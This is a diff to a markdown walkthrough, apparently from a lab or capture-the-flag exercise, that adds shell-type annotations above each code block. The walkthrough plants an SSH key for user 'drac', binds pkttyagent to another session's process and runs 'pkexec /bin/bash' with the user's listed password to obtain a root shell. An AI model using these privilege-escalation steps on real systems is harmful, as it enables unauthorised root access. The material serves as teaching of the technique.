@@ -13,6 +13,7 @@ Used on: **IDE**
 ## Steps
 
 ### 1. Generate SSH key for stable key-auth sessions
+<!-- cmd: linux -->
 ```bash
 # On attacker machine
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_drac
@@ -27,17 +28,20 @@ chmod 600 /home/drac/.ssh/authorized_keys
 ### 2. Open two key-auth SSH sessions
 
 **Terminal 1 (main session):**
+<!-- cmd: linux -->
 ```bash
 ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 ```
 
 **Terminal 2 (agent session):**
+<!-- cmd: linux -->
 ```bash
 ssh -i ~/.ssh/id_rsa_drac drac@TARGET_IP
 ```
 
 ### 3. From Terminal 2 — identify the PID of Terminal 1's SSH session
 
+<!-- cmd: linux -->
 ```bash
 ps aux | grep sshd | grep drac | grep -v grep
 # root 12345 ... sshd: drac@pts/0
@@ -45,6 +49,7 @@ ps aux | grep sshd | grep drac | grep -v grep
 
 ### 4. Start pkttyagent bound to Terminal 1's process
 
+<!-- cmd: linux -->
 ```bash
 pkttyagent --process 12345 --notify-fd 1
 ```
@@ -53,6 +58,7 @@ The agent is now waiting for an authentication request from PID 12345.
 
 ### 5. From Terminal 1 — run pkexec
 
+<!-- cmd: linux -->
 ```bash
 pkexec /bin/bash
 ```
@@ -69,6 +75,7 @@ Enter `drac`'s password (`Th3dRaCULa1sR3aL`).
 
 ### 6. Root shell in Terminal 1
 
+<!-- cmd: linux -->
 ```bash
 id
 # uid=0(root) gid=0(root) groups=0(root)
